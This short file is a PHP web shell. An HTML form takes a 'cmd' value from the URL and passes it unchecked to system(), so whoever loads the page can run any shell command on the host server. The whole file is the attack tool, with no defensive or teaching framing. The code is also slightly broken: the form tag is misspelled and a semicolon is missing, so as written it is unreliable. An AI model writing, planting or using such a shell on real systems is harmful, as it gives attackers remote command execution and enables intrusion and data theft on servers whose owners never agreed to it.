<html>
    <body>
    <from method="GET" name="
    <?php
    echo basename($_SERVER['PHP_SELF']);
    ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="70">

    <input type="SUBMIT" value="Execute">
</form>
<pre>
    <?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'])
    }
?>
</pre>
</body>
</html>
